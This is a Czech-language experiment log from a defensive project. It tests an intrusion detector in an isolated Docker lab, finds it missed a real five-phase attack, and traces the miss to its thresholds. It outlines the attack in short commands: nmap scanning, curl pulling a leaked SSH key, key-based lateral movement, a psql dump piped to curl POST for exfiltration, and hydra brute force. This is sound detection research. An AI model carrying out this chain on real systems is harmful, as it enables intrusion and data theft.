# Krok 47: vlastní izolovaná laboratoř se skutečnými útočnými nástroji

Podklad: `predreg-krok47.md`, kód zmrazen na `444976b`. Laboratoř: 8 kontejnerů (router, web, app, db, jump, 2 stanice, útočník) + druhý nezávislý útočník, Docker, izolované sítě bez publikovaných portů. Žádný skript neautomatizoval útok — každý krok jsem spustil sám, příkaz po příkazu, se zápisem do `runbook.jsonl` v reálném čase.

## Co se stalo (skutečné nástroje, ne generátor)

1. **Recon:** `nmap -Pn -p 1-1000` proti web — 1006 toků, 998 REJ, 2 RSTO, 6 SF, za 0,12 s.
2. **Initial access:** `curl` nalezl a stáhl zálohový soubor `/backup/web-config.bak`, exponovaný omylem přes HTTP — obsahoval privátní SSH klíč.
3. **Lateral movement:** `ssh -i <nalezený klíč>` na app jako `appsvc`. **Reálná, neplánovaná komplikace:** Alpine `adduser -D` vytváří uzamčený účet; OpenSSH od určité verze odmítne i klíčové přihlášení k uzamčenému účtu ("account is locked"), bez ohledu na platný klíč. Objevil a opravil jsem to až přes `-vv` ladění a server-side debug sshd — to je reálná neznalost výsledku dopředu, ne předstíraná.
4. **Collection:** `psql` z app na db, dotaz na tabulku 5000 řádků.
5. **Exfiltrace:** `psql ... copy to stdout | curl -X POST` — 188 893 B odeslaných na sink útočníka, 200 OK.
6. **Nezávislý druhý útočník:** `hydra` — 7 pokusů hesla na SSH účet jump, 0 úspěchů (heslové přihlášení vypnuté).

Běžící pozadí: periodické HTTP dotazy ze dvou stanic a legitimní administrativní SSH kanál (jump → app) souběžně s útokem. Záznam převeden `zeek/zeek:9.0.1`: 1234 toků, http/ssh/postgresql rozpoznáno.

## Výsledek: Salticus útok téměř neviděl

| | A (v1) | C (`corr_v3`+`ext`+`related`) |
|---|---|---|
| zobrazeno za celou kampaň | 3 | 3 |
| z toho dotýká se kampaně | 1 | 1 |
| typ nálezů | `unmapped_passive_event` (2×), nic specifického pro útok | stejné |
| `coverageStatus.immature_hosts` | 5 / 5 | 5 / 5 |

**H1 platí** (zobrazené nálezy v A a C totožné). **H2, H3, H4, H5 se nehodnotí jako platné/neplatné ve smyslu přínosu korelace — nemá se čím seskupovat** (jen 1 nález dotýkající se kampaně, žádný incident). To samo je důležitější zjištění, než by bylo porovnání ramen: **reálný pětifázový útok skutečnými nástroji vygeneroval prakticky žádný signál.**

## Krok 48: proč (diagnostika studeného startu a prahů)

`coverageStatus` ukázal `immature_hosts: 5 z 5` — žádný hostitel v laboratoři nemá zralý profil (síť běžela jen 21 sekund před prvním útočným tokem). To odpovídá obavě nezávislého posuzovatele (volná úvaha z 26. 11.) o studeném startu. Vytvořil jsem diagnostiku (`tools/k48_warmup.py`, `predreg-krok48.md`): skutečně zachycené pozadí se zopakuje s posunutými časovými razítky přes 50 h před útokem (obsah beze změny, jen čas), skutečný útok se připojí nezměněný.

| | bez zahřívání (krok 47) | s 50 h zahřívání (krok 48) |
|---|---|---|
| `immature_hosts` v okně útoku | 5/5 | **0/4** |
| zobrazeno za kampaň | 1 | 3 (stále jen `unmapped_passive_event`) |
| nález specifický pro útok | 0 | **0** |

**H1 kroku 48 platí** (zralost se vyřešila). **H2 a H3 neplatí** (žádný nález specifický pro útok se nezobrazil ani se zralým profilem). **Příčina chybějící detekce tedy NENÍ studený start** — je to závažnější zjištění, protože ukazuje na problém v samotných prazích, ne jen v jejich načasování.

### Zjištěné konkrétní příčiny (ověřeno v kódu)

1. **Exfiltrace 188 893 B je 5 300× pod absolutním prahem bez historie** (`cold_bytes: 1.0e9` = 1 GB, `src/behavior/egress_volume.rs:54`). Shoduje se s dřívějším zjištěním v `impl-krok26.md` (práh 300 MB = 0/10, 1,5 GB = 10/10, "práh je volba autora, ne odhad z dat") — teď potvrzeno i na reálné, realisticky malé exfiltraci (dump jedné tabulky), ne jen na syntetických epizodách.
2. **Vertikální sken na 1000 různých portů pravděpodobně nemá s čím se srovnat.** `scan_attempts` vzniká z anomálie skórované podle `(cíl, port)` dvojice proti vrstevníkům na stejném portu (`anomaly_v3.rs`, popsáno už v `impl-krok26.md` u SSH hrubé síly). Sken na 1000 různých portů vytvoří 1000 jednotlivých klíčů, každý s jedinou pozorovanou hodnotou a bez vrstevníků — podle stejné logiky, která v kroku 26 vysvětlila chybějící SSH detekci bez vrstevníků. Toto je silná hypotéza podložená strukturou kódu, ne izolovaně ověřená jednotkovým testem.
3. **Sken proběhl v 0,12 s**, mnohem rychleji než syntetický generátor předpokládá (`vertical_scan` v `k25_inject.py`: 10 portů/s, tedy 100 s na 1000 portů). Pokud existuje práh na minimální rozestup mezi pokusy nebo na minimální dobu trvání skenu, reálný nástroj na rychlé síti ho nemusí splnit.

## Co z toho plyne

1. **Nezávislé potvrzení přínosu korelace se na tomto vzorku NEPROKÁZALO** — ne proto, že by korelace selhala, ale protože detekce samotná před ní téměř nic nedodala k seskupení. To je čistý, poctivý nulový výsledek kvůli chybějícímu vstupu, ne kvůli korelaci.
2. **Důležitější zjištění je nad rámec korelace:** prahy v3 (objemová exfiltrace, pravděpodobně i vertikální sken) jsou kalibrované na objemy a rychlosti, které syntetický generátor předpokládal, ne na to, co reálné nástroje na reálně rychlé síti skutečně produkují. Realistická exfiltrace (dump jedné tabulky, ne gigabajty) a realisticky rychlý sken (ne 10 portů/s) byly oba pod radarem.
3. Toto přímo podporuje doporučení nezávislého posuzovatele (volná úvaha, 26. 11.): nahradit autorské skalární prahy real-data odvozenými nebo aspoň přehodnotit je na realistických, ne jen syntetických, vzorcích chování.

## Omezení

Jedna laboratoř, jeden běh; topologii a útok jsem navrhl já, ale provedení nástroji a jejich chování (včetně uzamčeného účtu) bylo reálné a nepředvídané. Zahřívání v kroku 48 je syntetické posunutí časových razítek skutečného pozadí, ne 50 hodin skutečné rozmanité provozu — zralost profilu se tím prokazatelně vyřešila, ale rozmanitost provozu ne. Žádná host-identita (sshd log se nezapsal, chybí syslog démon v laboratoři) — potvrzení druhým zdrojem na tomto datasetu neměřeno.

Reprodukce: `tools/k47_lab.py`, `tools/k48_warmup.py`. Data lokálně `F:\work-tmp\corrlab2` (laboratoř zůstává nahraná pro případné další kroky).
